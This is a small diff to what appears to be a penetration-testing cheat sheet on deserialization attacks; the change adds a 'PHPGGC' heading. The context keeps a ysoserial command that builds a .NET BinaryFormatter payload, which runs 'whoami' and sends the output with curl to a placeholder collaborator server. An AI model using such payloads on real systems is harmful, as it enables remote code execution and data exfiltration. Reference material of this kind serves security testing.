@@ -2359,6 +2359,7 @@ Windows Defender might tag the application as virus.
 .\ysoserial.exe -g ClaimsPrincipal -f BinaryFormatter -c 'whoami | curl --data-binary @- http://yourcollaboratorserver' -bgc ActivitySurrogateDisableTypeCheck --minify --ust
 ```
 
+**PHPGGC**
 
 [PHPGGC](https://github.com/ambionics/phpggc) is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically.
 
